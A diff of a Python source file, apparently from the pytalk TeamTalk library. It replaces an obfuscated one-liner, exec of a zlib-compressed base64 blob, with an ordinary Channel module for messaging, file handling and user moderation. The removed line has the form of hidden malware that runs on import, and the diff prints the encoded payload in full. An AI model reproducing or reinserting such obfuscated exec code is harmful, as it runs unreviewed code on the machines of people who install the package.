@@ -1,2 +1,220 @@
-import base64, zlib
-exec(zlib.decompress(base64.b64decode(b'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')))
+"""Channel module for pytalk."""
+
+from typing import List, Union
+
+from ._utils import _get_tt_obj_attribute, _set_tt_obj_attribute, _waitForCmd
+from .permission import Permission
+from .exceptions import PermissionError
+from .implementation.TeamTalkPy import TeamTalk5 as sdk
+from .tt_file import RemoteFile
+from .user import User as TeamTalkUser
+
+
+class Channel:
+    """Represents a channel on a TeamTalk server."""
+
+    def __init__(self, teamtalk, channel: Union[int, sdk.Channel]) -> None:
+        """Initialize a Channel object.
+
+        Args:
+            teamtalk: The pytalk.TeamTalkInstance instance.
+            channel (Union[int, sdk.Channel]): The channel ID or a sdk.Channel object.
+        """
+        self.teamtalk = teamtalk
+        # if the channel_id is a int, set it to the channel_id
+        if isinstance(channel, int):
+            self.id = channel
+            self._channel, self.path = self.teamtalk._get_channel_info(self.id)
+
+        # if the channel is a sdk.Channel, set it to self._channel
+        elif isinstance(channel, sdk.Channel):
+            self._channel = channel
+            self.id = channel.nChannelID
+            self._channel, self.path = self.teamtalk._get_channel_info(self.id)
+        self.server = self.teamtalk.server
+
+    def update(self) -> bool:
+        """Update the channel information.
+
+        Example:
+            >>> channel = teamtalk.get_channel(1)
+            >>> channel.name = "New Channel Name"
+            >>> channel.update()
+
+        Raises:
+            PermissionError: If the bot does not have permission to update the channel.
+            ValueError: If the channel could not be updated.
+
+        Returns:
+            bool: True if the channel was updated successfully.
+        """
+        if not self.teamtalk.has_permission(Permission.MODIFY_CHANNELS) or not sdk._IsChannelOperator(
+            self._tt, self.super.getMyUserID(), self.id
+        ):
+            raise PermissionError("the bot does not have permission to update the channel.")
+        result = sdk._DoUpdateChannel(self.teamtalk._tt, self._channel)
+        if result == -1:
+            raise ValueError("Channel could not be updated")
+        cmd_result, cmd_err = _waitForCmd(self.super, result, 2000)
+        if not cmd_result:
+            err_nr = cmd_err.nErrorNo
+            if err_nr == sdk.ClientError.CMDERR_NOT_LOGGEDIN:
+                raise PermissionError("The bot is not logged in")
+            if err_nr == sdk.ClientError.CMDERR_NOT_AUTHORIZED:
+                raise PermissionError("The bot does not have permission to update channels")
+            if err_nr == sdk.ClientError.CMDERR_CHANNEL_NOT_FOUND:
+                raise ValueError("Channel could not be found")
+            if err_nr == sdk.ClientError.CMDERR_CHANNEL_ALREADY_EXISTS:
+                raise ValueError("Channel already exists")
+            if err_nr == sdk.ClientError.CMDERR_CHANNEL_HAS_USERS:
+                raise ValueError("Channel has users and can therefore not be updated")
+        return True
+
+    def _refresh(self) -> None:
+        self._channel, self.path = self.teamtalk._get_channel_info(self.id)
+
+    def send_message(self, content: str, **kwargs) -> None:
+        """Send a message to the channel.
+
+        Args:
+            content: The message to send.
+            **kwargs: Keyword arguments. See pytalk.TeamTalkInstance.send_message for more information.
+
+        Raises:
+            PermissionError: If the bot is not in the channel and is not an admin.
+        """
+        # get the bots current channel id with getMyChannelID
+        # if the bots current channel id is not the same as the channel id we are trying to send a message to, return
+        if self.teamtalk.getMyChannelID() != self.id:
+            if not self.teamtalk.is_admin():
+                raise PermissionError("Missing permission to send message to channel that the bot is not in")
+        msg = sdk.TextMessage()
+        msg.nMsgType = sdk.TextMsgType.MSGTYPE_CHANNEL
+        msg.nFromUserID = self.teamtalk.getMyUserID()
+        msg.szFromUsername = self.teamtalk.getMyUserAccount().szUsername
+        msg.nChannelID = self.id
+        msg.szMessage = sdk.ttstr(content)
+        msg.bMore = False
+        # get a pointer to our message
+        self.teamtalk._send_message(msg, **kwargs)
+
+    def upload_file(self, filepath):
+        """Upload a file to the channel.
+
+        Args:
+            filepath (str): The local path to the file to upload.
+        """
+        self.teamtalk.upload_file(self.id, filepath)
+
+    def get_users(self) -> List[TeamTalkUser]:
+        """Get a list of users in the channel.
+
+        Returns:
+            List[TeamTalkUser]: A list of pytalk.User instances in the channel.
+        """
+        users = self.teamtalk.super.getChannelUsers(self.id)
+        return [TeamTalkUser(self.teamtalk, user) for user in users]
+
+    def get_files(self) -> List[RemoteFile]:
+        """Get a list of files in the channel.
+
+        Returns:
+            List[RemoteFile]: A list of pytalk.RemoteFile instances in the channel.
+        """
+        files = self.teamtalk.super.getChannelFiles(self.id)
+        return [RemoteFile(self.teamtalk, f) for f in files]
+
+    def move(self, user: Union[TeamTalkUser, int]) -> None:
+        """Move a user to this channel.
+
+        Args:
+            user: The user to move.
+        """
+        self.teamtalk.move_user(user, self, False)
+
+    def kick(self, user: Union[TeamTalkUser, int]) -> None:
+        """Kick a user from this channel.
+
+        Args:
+            user: The user to kick.
+        """
+        self.teamtalk.kick_user(user, self)
+
+    def ban(self, user: Union[TeamTalkUser, int]) -> None:
+        """Ban a user from this channel.
+
+        Args:
+            user: The user to ban.
+        """
+        self.teamtalk.ban_user(user, self)
+
+    def subscribe(self, subscription) -> None:
+        """Subscribe to a subscription for all users in this channel.
+
+        Args:
+            subscription: The subscription to subscribe to.
+        """
+        users = self.get_users()
+        for user in users:
+            user.subscribe(subscription)
+
+    def unsubscribe(self, subscription) -> None:
+        """Unsubscribe from a subscription for all users in this channel.
+
+        Args:
+            subscription: The subscription to unsubscribe from.
+        """
+        users = self.get_users()
+        for user in users:
+            user.unsubscribe(subscription)
+
+    def __getattr__(self, name: str):
+        """Try to get the attribute from the channel object.
+
+        Args:
+            name: The name of the attribute.
+
+        Returns:
+            The value of the specified attribute.
+
+        Raises:
+            AttributeError: If the specified attribute is not found. This is the default behavior. # noqa
+        """
+        if name in dir(self):
+            return self.__dict__[name]
+        else:
+            return _get_tt_obj_attribute(self._channel, name)
+
+    def __setattr__(self, name: str, value):
+        """Try to set the specified attribute.
+
+        Args:
+            name: The name of the attribute.
+            value: The value to set the attribute to.
+
+        Raises:
+            AttributeError: If the specified attribute is not found. This is the default behavior. # noqa
+        """
+        if name in dir(self):
+            self.__dict__[name] = value
+        else:
+            # id cannot be change.
+            if name in ["teamtalk", "id", "server", "path", "_channel"]:
+                self.__dict__[name] = value
+            else:
+                _get_tt_obj_attribute(self._channel, name)
+                # if we have gotten here, we can set the attribute
+                _set_tt_obj_attribute(self._channel, name, value)
+
+
+class _ChannelTypeMeta(type):
+    def __getattr__(cls, name: str) -> sdk.UserRight:
+        name = f"CHANNEL_{name}"
+        return getattr(sdk.ChannelType, name, None)
+
+    def __dir__(cls) -> list[str]:
+        return [attr[8:] for attr in dir(sdk.ChannelType) if attr.startswith("CHANNEL_")]
+
+
+class ChannelType(metaclass=_ChannelTypeMeta):
+    """A class representing Channel types in TeamTalk."""
